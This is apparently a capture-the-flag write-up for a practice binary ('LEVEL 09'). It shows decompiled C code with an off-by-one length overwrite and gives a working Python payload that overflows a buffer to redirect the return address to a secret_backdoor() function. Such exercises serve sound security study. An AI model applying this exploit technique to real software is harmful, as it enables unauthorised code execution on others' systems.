# LEVEL 09

* after decompiling the binary:
	- we that it read 128 char from stdin and write 41 char start from username + 140,
    so that means the 41th char can override the variable len in handle_msg.
		```c
		void set_username(char *data)
        {
            fgets(input, 128, stdin);
            idx = 0;
            while (idx <= 40 && input[idx] != 0)
            {
                (data + 140)[idx] = input[idx];
                idx++;
            }
        }
		```

	- here it read 1024 char from stdin and write `len` variable from `handle_msg()` of chars into data,
    so that means we can override the return address of `handle_msg()`
		```c
        void set_msg(char *data)
        {
            char input[1024];

            fgets(input, 1024, stdin);
            strncpy(data, input, ((int*)data)[45]);
        }
		```
 
* to exploit the program:
	- write 40 simple char + char(255) + "\n"
	- write 200 simple char + "\x8c\x48\x55\x55\x55\x55\x00\x00"
    ```sh
        python -c 'print "a" * 40 + "\xff"; print "b"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > input
    ```

#### explinations:
- `"\x8c\x48\x55\x55\x55\x55\x00\x00"` -> address of `secret_backdoor()`
- `200`: distance from `data` variable to the return address 
